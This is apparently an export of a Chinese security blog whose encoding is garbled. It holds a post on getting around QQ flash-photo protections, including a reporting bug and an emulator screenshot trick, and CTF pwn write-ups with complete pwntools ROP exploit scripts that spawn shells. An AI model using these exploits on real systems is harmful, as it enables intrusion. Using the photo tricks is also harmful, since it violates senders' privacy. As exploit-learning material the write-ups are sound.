&#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)2, (String)(&quot;decrypt had no encrypt,file:&quot; + string));                    return;                &#125;            &#125; else &#123;                long l = System.currentTimeMillis();                Object object = string + &quot;.tmp&quot;;                File file = new File(string);                long l2 = file.length() / 1024;                if ((object = new File((String)object)).exists()) &#123;                    object.delete();                &#125;                DESUtil.b(file, (File)object, string2.getBytes(&quot;UTF-8&quot;));                FileUtils.a((File)object, (File)file);                object.delete();                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)4, (String)(&quot;DES Decrypt filePath:&quot; + string + &quot;,key:&quot; + string2 + &quot;,costTime:&quot; + (System.currentTimeMillis() - l) + &quot;,fileSize:&quot; + l2 + &quot;KB&quot;));                    return;                &#125;            &#125;        &#125;        catch (UnsupportedEncodingException unsupportedEncodingException) &#123;            unsupportedEncodingException.printStackTrace();        &#125;    &#125;&#125;\n\næˆ‘ä»¥ä¸ºèƒœåˆ©åœ¨æœ›ï¼Œæˆ‘è¯·æ•™äº†å¸ˆå…„ï¼Œå‘ç°å…¶ä¸­å‡ ä¸ªåŒ…å¾—ä¸åˆ°ï¼Œæ ¹æœ¬ç ´è§£ä¸äº†ï¼ˆo(*â‰§â–½â‰¦)ãƒ„â”â”â”“ï¼‰\n1234package com.tencent.mobileqq.utils;import com.tencent.mobileqq.utils.FileUtils;import com.tencent.qphone.base.util.QLog;\n\né™¤æ­¤ä¹‹å¤–ï¼Œè¿˜ä¸çŸ¥é“keyä»ä½•æ¥ï¼Œå¤§ä½¬ä¹Ÿè¯´è¦ä¹ˆéœ€è¦å¤„äºç™»å½•çŠ¶æ€ç”¨ä¸€å®šæ–¹å¼ä»æœåŠ¡å™¨å¾—åˆ°ï¼Œè¦ä¹ˆä»æœ¬åœ°æ¶ˆæ¯å¯¹è±¡çš„å±æ€§ä¸­è·å¾—ï¼Œåæ­£å“ªä¸ªéƒ½ä¸å®¹æ˜“ï¼Œå•é ä¸€ä¸ª_fpæ–‡ä»¶å°±è§£å¯†å‡ºæ¥åŸæ–‡ä»¶åº”è¯¥ä¸å¤ªç°å®ã€‚æ‰€ä»¥æˆ‘å°±åªèƒ½æ”¾å¼ƒäº†ã€‚\nç ´è§£æ–¹æ³•è™½ç„¶å‰é¢è¯´äº†æ²¡è§£å‡ºæ¥ï¼Œä½†æ˜¯ä¸ä»£è¡¨ä¸èƒ½è·å¾—ç…§ç‰‡å•Šï¼ˆï¿£ï¸¶ï¿£ï¼‰â†—ã€€\næä¾›ä¸‰ç§æ–¹æ³•ï¼š\n\næ–¹æ³•ä¸€ï¼šåˆ©ç”¨bugå®ç°ï¼Œä¸¾æŠ¥å¥½å‹å¡«å†™ä¿¡æ¯æ—¶å‹¾é€‰é—ªç…§ï¼Œåœ¨ä¸¾æŠ¥æˆåŠŸåä¼šæ˜¾ç¤ºé—ªç…§å†…å®¹ï¼ˆå¥½å‹ï¼šæˆ‘tmçœŸçš„è°¢è°¢ä½ ï¼‰ï¼Œä¸è¿‡æˆ‘è§‰å¾—åé¢è…¾è®¯åº”è¯¥ä¼šä¿®å¤ã€‚\n\næ–¹æ³•äºŒï¼šæœ€ç®€å•çš„ï¼Œç”¨å¦ä¸€ä¸ªæ‰‹æœºæ‹ç…§ï¼Œæœ€å®ç”¨æœ€é è°±çš„(ï½ï¿£â–½ï¿£)ï½\n\næ–¹æ³•ä¸‰ï¼šåˆ©ç”¨æ¨¡æ‹Ÿæœºæ‰“å¼€qqï¼Œåœ¨æ¨¡æ‹Ÿæœºé‡Œé¢æ˜¯æ— æ³•é™åˆ¶ä¸»æœºæˆªå›¾çš„ï¼Œä¸‹è½½ä¸€ä¸ªVMOSæ¨¡æ‹Ÿæœºåï¼ˆåº”ç”¨å•†åº—æœ‰ï¼‰åœ¨é‡Œé¢ä¸‹è½½ä¸€ä¸ªqqæ‰“å¼€é—ªç…§æ—¶å°±å¯ä»¥æˆªå›¾äº†[](ï¿£â–½ï¿£)*\n\n\nä¸ªäººè§‚ç‚¹ï¼šæˆ‘è§‰å¾—éå¿…è¦æƒ…å†µæ²¡å¿…è¦å»è·å¾—é—ªç…§ï¼Œæ¯•ç«Ÿåˆ«äººå‘é—ªç…§å°±æ˜¯ä¸æƒ³è®©ä½ ä¿å­˜ï¼Œæ‰€ä»¥çœ‹çœ‹å°±è¡Œäº†\n","slug":"QQé—ªç…§","date":"2021-10-13T11:02:46.000Z","categories_index":"","tags_index":"æ„Ÿæƒ³","author_index":"Krito"},{"id":"2d83114abbe0d2e1d7c9af7e01c50ee1","title":"ROP-x64","content":"\n\n\n\n\n\n\n\n\nä¹‹å‰åœ¨å‰é¢å†™äº†ä¸€ç¯‡ä»‹ç»ROPçš„ï¼Œä¸è¿‡æ˜¯32ä½çš„ï¼Œå› ä¸º64ä½å’Œ32ä½å¤šå¤šå°‘å°‘æœ‰ä¸åŒç‚¹ï¼Œæ‰€ä»¥è¿™æ¬¡å°±ä»‹ç»64ä½ä¸‹çš„ROP\npwn07åšæ³•å’Œä¹‹å‰32ä½çš„ret2libc3æ€è·¯æ˜¯ä¸€è‡´çš„ï¼Œæ³„éœ²putså‡½æ•°åœ°å€æ‰¾åˆ°libcè®¡ç®—å‡ºsystemå‡½æ•°åœ°å€ä»è€Œè·å–shellã€‚**64ä½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°(å½“å‚æ•°å°äº7ä¸ªæ—¶ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨rdi,rsi,rdx,rcx,r8,r9)**ï¼Œæ‰€ä»¥æ‰§è¡Œsystem(â€œbin/shâ€)æ—¶rdiå¯„å­˜å™¨è¦å­˜å‚¨çš„æ˜¯bin/shå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š\næ³„éœ²putså‡½æ•°åœ°å€éœ€è¦å…ˆå°†putsçš„gotè¡¨åœ°å€ä¼ é€’åˆ°rdiå¯„å­˜å™¨ä¸­åœ¨è·³è½¬åˆ°putså‡½æ•°è¾“å‡º\n1payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)\n\nåœ¨æ‰§è¡Œsystemå‡½æ•°æ—¶ä¸ä»…è¦è®°ä½é€šè¿‡rdiä¼ å‚è¿˜è¦æ³¨æ„å †æ ˆå¯¹é½ï¼š\n1payload = &#x27;a&#x27;*20+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)\n\np64(ret_addr)ç›®çš„ç”¨äºå †æ ˆå¯¹é½ï¼Œä¸ç„¶åé¢ä¼šæŠ¥é”™ã€‚\nEXP123456789101112131415161718192021from pwn import *from LibcSearcher import LibcSearcher#p = process(&#x27;./pwn1&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28138)pop_rdi_ret = 0x04006e3  # ROPgadget --binary pwn1 --only &#x27;pop|ret&#x27;|grep &#x27;rdi&#x27;ret_addr = 0x4004c6 # ROPgadget --binary pwn1 --only &#x27;ret&#x27;elf = ELF(&#x27;./pwn1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]start_addr = elf.symbols[&#x27;_start&#x27;]payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)  # æ³„éœ²putså‡½æ•°çš„åœ°å€p.sendline(payload1)p.recvuntil(&#x27;\\x0a&#x27;)libc_puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))  # æ¥æ”¶åœ°å€libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)  # åŒ¹é…libcåº“libcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)  # è®¡ç®—åŸºåœ°å€sys_addr = libcbase+libc.dump(&#x27;system&#x27;)  # è®¡ç®—systemå‡½æ•°åœ°å€bin_sh = libcbase+libc.dump(&#x27;str_bin_sh&#x27;)  # è®¡ç®—bin/shå­—ç¬¦ä¸²åœ°å€payload = &#x27;a&#x27;*20+p64(0x4004c6)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)  # æ„é€ ropé“¾p.sendline(payload)p.interactive()\n\nret2csuç”±äºç¨‹åºæ²¡æœ‰è°ƒç”¨putså‡½æ•°ï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡putså‡½æ•°æ³„éœ²å‡½æ•°åœ°å€å¾—åˆ°libcã€‚æ‰€ä»¥ï¼Œè¿™æ¬¡æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªä¸‡èƒ½gadgetsæ¥æ³„éœ²å‡½æ•°åœ°å€è·å¾—libcï¼Œè¿™ä¸ªgadgetsåœ¨__ libc_csu_initå‡½æ•°é‡Œé¢ï¼Œè€Œè¿™ä¸ª  __libc_csu_initå‡½æ•°æ˜¯ç”¨æ¥å¯¹ libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ libc å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚\né€šè¿‡objdump -M intel -d level5å‘½ä»¤æ¥æŸ¥çœ‹åæ±‡ç¼–ï¼Œå°†å…¶ä¸­ä¸€éƒ¨åˆ†æŒ‡ä»¤åˆ’åˆ†ä¸ºgadgets1å’Œgadgets2ï¼Œå…¶ä¸­gadgets1ä½œç”¨æ˜¯å°†æ ˆé‡Œé¢çš„å€¼ä¼ ç»™å¯„å­˜å™¨ï¼Œè€Œgadgets2ä½œç”¨æ˜¯å°†ä¸€äº›å¯„å­˜å™¨çš„èµ‹ç»™å¦ä¸€äº›å¯„å­˜å™¨ã€‚\næ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨è¿™ä¸ªgadgetsæ¥è·å–shell\n\nåˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets ç»„è£…å¥½ write å‡½æ•°å¹¶æ³„éœ²writeå‡½æ•°åœ°å€ï¼Œå¹¶ä½¿å¾—ç¨‹åºé‡æ–°æ‰§è¡Œ main å‡½æ•°\næ ¹æ® libcsearcher è·å–å¯¹åº” libc ç‰ˆæœ¬ä»¥åŠsystemå‡½æ•°åœ°å€\nå†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets å‘ bss æ®µå†™å…¥system åœ°å€ä»¥åŠ â€˜/bin/shâ€™ åœ°å€ï¼Œå¹¶ä½¿å¾—ç¨‹åºé‡æ–°æ‰§è¡Œ main å‡½æ•°ã€‚\nå†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ‰§è¡Œ libc_csu_gadgets æ‰§è¡Œsystem(â€˜/bin/shâ€™) è·å– shellã€‚\n\n\nä¸‹å›¾å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨ä¸‡èƒ½gadgetsçš„æµç¨‹ï¼š\n\nç¬¬ä¸€æ¬¡å‘é€payloadï¼š1payload1 = &#x27;a&#x27;*0x80+&#x27;a&#x27;*8+p64(0x400606)+p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0) + &quot;a&quot;*56 + p64(main_addr)\n\np64(0x400606)ï¼šæ˜¯gadgets1çš„åœ°å€\np64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write)+ p64(8) ï¼šå¯¹åº”çš„å¯„å­˜å™¨ä¸ºrbx,rbp,r12,r13,r14,r15\nrbxå­˜å…¥0æ˜¯å› ä¸ºgadgets2ä¸­rbxä¼šåŠ 1å†ä¸rbpæ¯”è¾ƒï¼Œå¦‚æœä¸åŒå°±ä¼šè·³è½¬ï¼Œä¸èƒ½ç»§ç»­æŒ‰æˆ‘ä»¬çš„è¦æ±‚æ‰§è¡Œï¼Œæ‰€ä»¥å¿…é¡»ä¿è¯rbxåŠ 1ä»¥åè¦å’Œrbpçš„å€¼ä¸€æ ·ï¼Œæ‰€ä»¥åé¢çš„rbpå¡«å…¥1ï¼›p64(gadgets1)å°†ä¼šå¡«å…¥r12ï¼Œå› ä¸ºgadgets2ä¼šè·³è½¬åˆ°r12+rbx * 8çš„ä½ç½®ï¼Œå› ä¸ºrbxä¸º0æ‰€ä»¥å°±æ˜¯è·³è½¬åˆ°r12çš„ä½ç½®ï¼› p64(1) + p64(got_write) + p64(8)å°†ä¼šå¡«å…¥r13,r14,r15å¯„å­˜å™¨ï¼Œå†gadgets2ä¸­ä¼šè½¬ç§»åˆ°edi,rsi,rdxä¸­ï¼Œä¹Ÿå°±æ˜¯ç”¨äºä¼ å‚çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨ï¼›p64(got_write) + p64(1) + p64(got_write)+ p64(8)æœ€åç»„è£…æˆwrite(1,address,8)æ³„éœ²writeå‡½æ•°åœ°å€\np64(0x4005F0)ï¼šæ˜¯gadgets2çš„åœ°å€\nâ€œaâ€*56+p64(main_addr) ï¼šå› ä¸ºgadgets2åé¢æ˜¯gadgets1ï¼Œgadgets1ä¼šå¼¹å‡ºæ ˆé‡Œé¢çš„å€¼ï¼Œä¸ºäº†ä¸è®©gadgets1å½±å“åé¢æ“ä½œï¼Œå°±å¡«å…¥æ— ç”¨å­—ç¬¦ä¸²ï¼Œæœ€åè·³è½¬ä¼šmainå‡½æ•°\n\nç¬¬äºŒæ¬¡å‘é€payloadï¼š1payload2 =  &quot;\\x00&quot;*136+p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)+p64(0x4005F0)+&quot;a&quot;*56+p64(main)\n\n p64(got_read) + p64(0) + p64(bss_addr) + p64(16)ï¼šç»„è£…æˆread(0,bss_addr,16)ï¼Œä½œç”¨æ˜¯å‘bssæ®µå†™å…¥16å­—èŠ‚çš„ä¸œè¥¿\n\nç¬¬ä¸‰æ¬¡å‘é€payload1payload3 =  &quot;\\x00&quot;*136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) + p64(0x4005F0) + &quot;a&quot;*56 + p64(main_addr)\n\np64(bss_addr) + p64(bss_addr+8)+ p64(0) + p64(0)ï¼šç»„è£…æˆsystem(â€œbin/shâ€)ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªå‚æ•°æ‰€ä»¥åé¢ä¸¤ä¸ªå¡«é›¶ä¸ä¼šé€ æˆä»€ä¹ˆå½±å“\n\nEXP1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import LibcSearcherelf = ELF(&#x27;level5&#x27;)p = process(&#x27;./level5&#x27;)got_write = elf.got[&#x27;write&#x27;]got_read = elf.got[&#x27;read&#x27;]start = elf.symbols[&#x27;_start&#x27;]  payload1 =  &quot;a&quot;*136payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)   # è·³è½¬åˆ°gadgets1å¹¶æ„é€ writeå‡½æ•°æ³„éœ²writeå‡½æ•°payload1 += p64(0x4005F0)   # è·³è½¬åˆ°gadgets2å°†å¯¹åº”å‚æ•°æ”¾å…¥å¯¹åº”å¯„å­˜å™¨payload1 += &quot;a&quot;*56payload1 += p64(start)p.recvuntil(&quot;Hello, World\\n&quot;)print &quot;\\n#############sending payload1#############\\n&quot;p.send(payload1)write_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))  # æ¥æ”¶åœ°å€libc = LibcSearcher(&#x27;write&#x27;, write_addr)libcbase = write_addr-libc.dump(&#x27;write&#x27;)system_addr = libcbase+libc.dump(&#x27;system&#x27;)print &#x27;system_address:&#x27;,system_addrprint &#x27;libcbase:&#x27;,libcbasebss_addr=0x601028  # ç”¨äºå†™å…¥systemå‡½æ•°ä»¥åŠbin/shå­—ç¬¦ä¸²p.recvuntil(&quot;Hello, World\\n&quot;)payload2 =  &quot;a&quot;*136payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)   # æ„é€ readå‡½æ•°å‘bssæ®µå†™å…¥æ•°æ®payload2 += p64(0x4005F0) payload2 += &quot;a&quot;*56payload2 += p64(start)print &quot;\\n#############sending payload2#############\\n&quot;p.send(payload2)p.send(p64(system_addr))p.send(&quot;/bin/sh\\0&quot;)p.recvuntil(&quot;Hello, World\\n&quot;)payload3 =  &quot;a&quot;*136payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)   # è·³è½¬æ‰§è¡Œbssæ®µä¸­çš„å†…å®¹payload3 += p64(0x4005F0) payload3 += &quot;a&quot;*56payload3 += p64(start)print &quot;\\n#############sending payload3#############\\n&quot;p.send(payload3)p.interactive()\n\n\nframe fakingé¢˜ç›®å­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯åªæº¢å‡º16ä¸ªå­—èŠ‚ï¼Œè€Œ64ä½è¦æ„é€ ropé“¾é€šå¸¸éœ€è¦4*8=32å­—èŠ‚ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥æ³„éœ²ã€‚ä½†æ˜¯è¿™ä¸ªé¢˜ç›®æ˜¯æ— é™è¾“å…¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•é‡‡å–æ ˆè¿ç§»çš„æ–¹å¼ã€‚æ ˆè¿ç§»é€‚ç”¨äºä»¥ä¸‹æƒ…å†µï¼š\n\nå¯ä»¥æ§åˆ¶çš„æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°è¾ƒå°‘ï¼Œéš¾ä»¥æ„é€ è¾ƒé•¿çš„ ROP é“¾\nå¼€å¯äº† PIE ä¿æŠ¤ï¼Œæ ˆåœ°å€æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸã€‚\nå…¶å®ƒæ¼æ´éš¾ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚è¯´å°†æ ˆåŠ«æŒåˆ°å †ç©ºé—´ï¼Œä»è€Œåœ¨å †ä¸Šå†™ rop åŠè¿›è¡Œå †æ¼æ´åˆ©ç”¨\n\næ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯ï¼Œå…ˆåœ¨æ ˆä¸Šé¢æ„å»ºå¥½ROPé“¾ï¼Œä¹‹åè®©ç¨‹åºè·³è½¬æ‰§è¡Œæˆ‘ä»¬æ„å»ºå¥½çš„ROPé“¾ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“è·³è½¬åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ å¥½ROPé“¾çš„ä½ç½®ã€‚\nç¨‹åºä¼šä¸€ç›´æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå‡½æ•°ä¼šä½¿ç”¨readå‡½æ•°å°†è¾“å…¥å†…å®¹å†™å…¥bufå˜é‡ï¼Œå†ç”¨putså‡½æ•°è¾“å‡ºã€‚readå‡½æ•°ä¸åŒäºgetså‡½æ•°ï¼Œreadè¯»å–å®Œä»¥åä¸ä¼šåƒgetså‡½æ•°ä¸€æ ·åœ¨æ•°æ®åé¢è¡¥å……\\0ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬å°†ç¼“å†²åŒºå¡«æ»¡ï¼Œå°±å¯ä»¥æ³„éœ²rbpæŒ‡å‘çš„åœ°å€äº†ï¼Œå†é€šè¿‡è®¡ç®—åç§»å°±å¯ä»¥ç¡®å®šæ ˆçš„ä½ç½®äº†ã€‚\n\næ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—åç§»0x7fffffffde40-0x7fffffffddd0=0x70\n\næ‰€ä»¥payload2å°±æ„å»ºå¥½äº†\n123stack = u64(io.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, &#x27;\\0&#x27;)) - 0x70payload = &#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(0x400676)payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack)+p64(0x4006be)) #leave_ret\n\næ¥ä¸‹æ¥å°±æ˜¯åŒ¹é…libcåº“ä»¥åŠè®¡ç®—systemä»¥åŠbin/shçš„åœ°å€\n123456puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, &#x27;\\0&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase = puts_addr - libc.dump(&quot;puts&quot;)success(&quot;libc.address -&gt; &#123;:#x&#125;&quot;.format(libcbase))system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)\n\nç”±äºåˆ©ç”¨è¿‡ç¨‹ä¸­æ ˆçš„ç»“æ„ä¼šå‘ç”Ÿå˜åŒ–, æ‰€ä»¥ä¸€äº›å…³é”®çš„åç§»è¿˜éœ€è¦é€šè¿‡è°ƒè¯•æ¥ç¡®å®š\n\nç¬¬ä¸‰æ¬¡è¾“å…¥æ—¶ï¼ŒrbpæŒ‡å‘åœ°å€å¯¹åº”æ ˆå¸§åç§»ä¸å†æ˜¯stackäº†ï¼Œè€Œæ˜¯stack-0x30äº†ã€‚ä¿®æ”¹åå¾—åˆ°payload3\n12payload=flat([&#x27;a&#x27;*8, ret_addr,pop_rdi_ret,binsh_addr,system_addr])payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack)+p64(0x4006be))\n\nEXP1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.binary = &quot;./over.over&quot;pop_rdi_ret = 0x400793ret_addr = 0x0400509io = process(&quot;./over.over&quot;)elf = ELF(&quot;./over.over&quot;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)io.sendafter(&quot;&gt;&quot;, &#x27;a&#x27; * 80)stack = u64(io.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, &#x27;\\0&#x27;)) - 0x70success(&quot;stack -&gt; &#123;:#x&#125;&quot;.format(stack))payload = &#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(0x400676)payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack)+p64(0x4006be)) #leave_retio.sendafter(&quot;&gt;&quot;, payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, &#x27;\\0&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase = puts_addr - libc.dump(&quot;puts&quot;)success(&quot;libc.address -&gt; &#123;:#x&#125;&quot;.format(libcbase))system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload=flat([&#x27;a&#x27;*8, ret_addr,pop_rdi_ret,binsh_addr,system_addr])payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack-0x30)+p64(0x4006be))io.sendlineafter(&quot;&gt;&quot;, payload)io.interactive()\n\n\n\n","slug":"ROP-x64","date":"2021-10-05T11:59:10.000Z","categories_index":"å­¦ä¹ è®°å½•","tags_index":"pwn","author_index":"Krito"},{"id":"a1737faa9c5d2f3d8075974e9ccad146","title":"ROP-x86","content":"ROPåŸç†éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP(Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚\nä¹‹æ‰€ä»¥ç§°ä¹‹ä¸º ROPï¼Œæ˜¯å› ä¸ºæ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„ ret æŒ‡ä»¤ï¼Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºã€‚ROP æ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶\n\nç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚\nå¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚\n\nå¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚\nret2textæ–¹æ³•æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)\næ€è·¯é¦–å…ˆæŸ¥çœ‹é™„ä»¶ï¼Œ32ä½å¯æ‰§è¡Œæ–‡ä»¶ä¸”åªå¼€äº†NXä¿æŠ¤\n\nåˆ©ç”¨IDAæŸ¥çœ‹ä¼ªä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸»å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´\nä¸ä»…å¦‚æ­¤ï¼Œåœ¨secureå‡½æ•°ä¸­å‘ç°äº†ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶åœ°å€ä¸º0x0804863Aï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨secureå‡½æ•°çš„ä»£ç æ¥è·å–ç³»ç»Ÿçš„shell\næ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—sçš„åç§»é‡ã€‚è®¾ç½®æ–­ç‚¹0x08048641ï¼Œè¿›è¡Œè°ƒè¯•\nå¯ä»¥çœ‹åˆ°ï¼ŒespæŒ‡å‘åœ°å€ä¸º0xffffcf70ï¼ŒebpæŒ‡å‘åœ°å€ä¸º0xffffcff8ï¼Œå› ä¸ºsçš„åœ°å€ä¸ºesp+0x1cï¼Œæ‰€ä»¥sç›¸å½“äºebpçš„åç§»é‡ä¸ºï¼š0xffffcff8-0xffffcf70-0x1c=0x6cï¼Œsç›¸å½“äºè¿”å›åœ°å€çš„åç§»é‡ä¸ºï¼š 0x6c+4\nEXP123456from pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;a&#x27; * (0x6c+4) + p32(target))sh.interactive()\n\né€šè¿‡æ ˆæº¢å‡ºç›´æ¥è·³è½¬åˆ°å¯¹åº”çš„åé—¨å‡½æ•°ï¼Œä»è€Œè·å–shellï¼Œå †æ ˆå›¾å¦‚ä¸‹ï¼š\n\nret2shellcodeæ–¹æ³•ç¨‹åºæ‰§è¡Œæˆ‘ä»¬è‡ªå·±å¡«å……çš„shellcodeä»£ç \næ€è·¯æŒ‰ç…§ret2textæ€è·¯ï¼Œå‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œè®¡ç®—å‡ºsç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»é‡ä¸º112ã€‚æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰å‘ç°systemå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šå¤åˆ¶åˆ°buf2ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨buf2æ„é€ shellcodeä»£ç ï¼Œ\nå…ˆåˆ¤æ–­ä¸€ä¸‹buf2æ‰€åœ¨åœ°å€æ˜¯å¦å¯æ‰§è¡Œã€‚åˆ©ç”¨IDAæŸ¥çœ‹buf2çš„åœ°å€\nåœ¨æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€æ˜¯å¦å¯æ‰§è¡Œã€‚å‘ç°è¿™ä¸ªåœ°å€å¯è¯»å¯å†™å¯æ‰§è¡Œã€‚\nä¹‹åæ„å»ºpayload\nEXP12345678910111213from pwn import *sh = process(&#x27;./ret2shellcode&#x27;)buf2 = 0x804A080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112, &#x27;a&#x27;) + 